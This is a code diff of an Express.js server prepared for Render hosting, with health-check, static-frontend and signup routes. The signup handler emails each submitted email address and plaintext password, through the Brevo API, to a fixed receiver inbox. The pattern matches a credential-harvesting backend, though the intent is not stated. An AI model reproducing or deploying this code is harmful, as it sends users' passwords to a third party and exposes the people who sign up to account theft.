@@ -5,80 +5,95 @@ import * as SibApiV3Sdk from "@sendinblue/client";
 
 dotenv.config();
 
-async function startServer() {
-  const app = express();
-  const PORT = process.env.PORT || 3000;
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-  app.use(express.json());
+app.use(express.json());
 
-  // ✅ HEALTH CHECK ROUTE (fixes "Cannot GET /")
-  app.get("/", (req, res) => {
-    res.send("Server is running 🚀");
-  });
+/**
+ * =========================
+ * HEALTH CHECK (Render)
+ * =========================
+ */
+app.get("/health", (req, res) => {
+  res.status(200).send("OK");
+});
 
-  // ✅ SIGNUP ROUTE
-  app.post("/api/signup", async (req, res) => {
-    const { email, password } = req.body;
+/**
+ * =========================
+ * SIGNUP ROUTE (BREVO)
+ * =========================
+ */
+app.post("/api/signup", async (req, res) => {
+  const { email, password } = req.body;
 
-    if (!email || !password) {
-      return res.status(400).json({
-        error: "Email and password are required",
-      });
-    }
+  if (!email || !password) {
+    return res.status(400).json({ error: "Email and password required" });
+  }
 
-    const brevoKey = process.env.BREVO_API_KEY;
-    const receiverEmail = process.env.RECEIVER_EMAIL;
-    const senderEmail = process.env.EMAIL_USER;
+  const brevoKey = process.env.BREVO_API_KEY;
+  const receiverEmail = process.env.RECEIVER_EMAIL;
 
-    if (!brevoKey || !receiverEmail || !senderEmail) {
-      console.error("Missing env variables");
-      return res.status(500).json({ error: "Server misconfigured" });
-    }
+  /**
+   * IMPORTANT:
+   * This must be a VERIFIED sender in Brevo
+   * NOT just any Gmail
+   */
+  const senderEmail = process.env.EMAIL_USER;
 
-    try {
-      console.log("📨 Sending Brevo email...");
+  if (!brevoKey || !receiverEmail || !senderEmail) {
+    console.error("❌ Missing env vars");
+    return res.status(500).json({ error: "Server misconfigured" });
+  }
 
-      const apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();
+  try {
+    console.log("📨 Sending Brevo email...");
 
-      apiInstance.setApiKey(
-        SibApiV3Sdk.TransactionalEmailsApiApiKeys.apiKey,
-        brevoKey
-      );
+    const apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();
 
-      const result = await apiInstance.sendTransacEmail({
-        sender: {
-          email: senderEmail,
-          name: "Signup System",
+    apiInstance.setApiKey(
+      SibApiV3Sdk.TransactionalEmailsApiApiKeys.apiKey,
+      brevoKey
+    );
+
+    const response = await apiInstance.sendTransacEmail({
+      sender: {
+        email: senderEmail,
+        name: "Render Signup System",
+      },
+      to: [
+        {
+          email: receiverEmail,
         },
-        to: [
-          {
-            email: receiverEmail,
-          },
-        ],
-        subject: "New Signup Received",
-        htmlContent: `
-          <h2>New Signup</h2>
-          <p><b>Email:</b> ${email}</p>
-          <p><b>Password:</b> ${password}</p>
-        `,
-      });
+      ],
+      subject: "New Signup Received",
+      htmlContent: `
+        <h2>New Signup</h2>
+        <p><b>Email:</b> ${email}</p>
+        <p><b>Password:</b> ${password}</p>
+      `,
+    });
 
-      console.log("✅ Brevo success:", result);
+    console.log("✅ Email sent:", response);
 
-      return res.status(200).json({
-        success: true,
-        message: "Email sent successfully",
-      });
-    } catch (err) {
-      console.error("❌ Brevo error:", err);
-      return res.status(500).json({
-        error: "Failed to send email",
-      });
-    }
-  });
+    return res.json({
+      success: true,
+      message: "Email sent",
+    });
+  } catch (err) {
+    console.error("❌ Brevo error:", err);
+    return res.status(500).json({
+      error: "Email failed",
+    });
+  }
+});
 
-  // ✅ PRODUCTION FRONTEND FIX (IMPORTANT FOR RENDER)
-  const distPath = path.join(process.cwd(), "dist");
+/**
+ * =========================
+ * SERVE FRONTEND (RENDER FIX)
+ * =========================
+ */
+const distPath = path.resolve(process.cwd(), "dist");
 
 app.use(express.static(distPath));
 
@@ -86,10 +101,11 @@ app.get("*", (req, res) => {
   res.sendFile(path.join(distPath, "index.html"));
 });
 
-  // ✅ START SERVER (Render requirement)
-  app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server running on port ${PORT}`);
-  });
-}
-
-startServer();
+/**
+ * =========================
+ * START SERVER (RENDER)
+ * =========================
+ */
+app.listen(PORT, "0.0.0.0", () => {
+  console.log(`Server running on port ${PORT}`);
+});
